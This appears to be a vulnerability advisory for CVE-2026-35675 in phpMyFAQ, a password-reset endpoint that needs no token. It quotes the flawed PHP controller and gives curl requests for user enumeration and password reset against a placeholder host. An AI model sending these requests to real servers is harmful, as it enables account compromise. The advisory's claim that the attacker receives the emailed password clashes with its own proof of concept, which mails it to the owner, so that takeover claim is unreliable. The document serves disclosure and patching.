aliases:
  - CVE-2026-35675
summary: "phpMyFAQ: Missing Password Reset Token Allows Account Takeover via Username/Email\
  \ Enumeration\n### Summary\nAn authentication bypass vulnerability in phpMyFAQ allows any\
  \ unauthenticated attacker to reset the password of any user account, including SuperAdmin\
  \ accounts. By sending a PUT request with just a valid username and associated email address\
  \ to /api/user/password/update, an attacker receives a new plaintext password via email without\
  \ any token verification, rate limiting, or email confirmation. This enables complete account\
  \ takeover of any user, including full administrative access.\n\n\n### Details\nFile: phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/UnauthorizedUserController.php\n\
  Lines: 56-130\nThe updatePassword() method at line 56 accepts PUT requests to /user/password/update\
  \ with only username and email in the JSON body:\n#[Route(path: 'user/password/update', name:\
  \ 'api.private.user.password', methods: ['PUT'])]\n```php\npublic function updatePassword(Request\
  \ $request): JsonResponse\n{\n    $data = json_decode($request->getContent());\n    $username\
  \ = trim((string) Filter::filterVar($data->username, FILTER_SANITIZE_SPECIAL_CHARS));\n  \
  \  $email = trim((string) Filter::filterEmail($data->email));\n    if ($username !== '' &&\
  \ $username !== '0' && ($email !== '' && $email !== '0')) {\n        $user = ($this->currentUserFactory\
  \ ?? CurrentUser::getCurrentUser(...))($this->configuration);\n        $loginExist = $user->getUserByLogin($username);\n\
  \        if ($loginExist && $email === $user->getUserData('email')) {\n            // NO TOKEN\
  \ CHECK\n            // NO RATE LIMITING\n            // NO EMAIL VERIFICATION\n         \
  \   $newPassword = $user->createPassword();\n            $user->changePassword($newPassword);\n\
  \            $mail->send(); // New password sent in plaintext\n        }\n    }\n}\n\n\n```\n\
  \n### Root Causes:\n1. No time-limited cryptographic token required for password reset\n2.\
  \ No rate limiting on the endpoint (allows unlimited username/email enumeration)\n3. No verification\
  \ email sent to original address before reset\n4. New password sent in plaintext email without\
  \ any confirmation step\n\n\n### PoC\nPrerequisites: None (unauthenticated attack)\nStep 1\
  \ - Username/Email Enumeration (no rate limiting):\nTest with wrong email - reveals if user\
  \ exists\n```bash\ncurl -X PUT -H \"Content-Type: application/json\" \\\n  -d '{\"username\"\
  :\"admin\",\"email\":\"wrong@test.com\"}' \\\n  http://target/phpmyfaq/api/user/password/update\n\
  ```\nResponse: {\"error\":\"The email doesn't exist...\"}  <- user exists but wrong email\n\
  \nOR\n\nResponse: {\"error\":\"The user doesn't exist\"}     <- user doesn't exist\n\nStep\
  \ 2 - Password Reset (no token required):\n```bash\ncurl -X PUT -H \"Content-Type: application/json\"\
  \ \\\n  -d '{\"username\":\"admin\",\"email\":\"admin@target.com\"}' \\\n  http://target/phpmyfaq/api/user/password/update\n\
  ```\n\nResponse: {\"success\":\"Email has been sent.\"}\nThe new plaintext password is sent\
  \ to admin@target.com\n\nStep 3 - Account Takeover:\nAttacker now has valid credentials and\
  \ can log in as SuperAdmin.\n\n\n\n### Impact\nAspect\tDetails\nVulnerability Type\tAuthentication\
  \ Bypass / Weak Password Recovery Mechanism (CWE-640)\nAttack Vector\tNetwork (unauthenticated\
  \ HTTP request)\nPrivileges Required\tNone\nUser Interaction\tNone\nScope\tFull administrative\
  \ access to phpMyFAQ\nConfidentiality\tHigh - attacker gains full access to all user data\
  \ and FAQ content\nIntegrity\tHigh - attacker can modify all content and settings\nAvailability\t\
  High - attacker can lock out legitimate users\nWho is Impacted:\n- All phpMyFAQ administrators\
  \ using default installations\n- Any organization using phpMyFAQ for internal knowledge bases\n\
  - End users whose accounts could be compromised\n- Organizations relying on phpMyFAQ for customer\
  \ support FAQs\nAttack Complexity: Very Low - no special knowledge or conditions required\
  \ beyond knowing/guessing a valid username and associated email address"
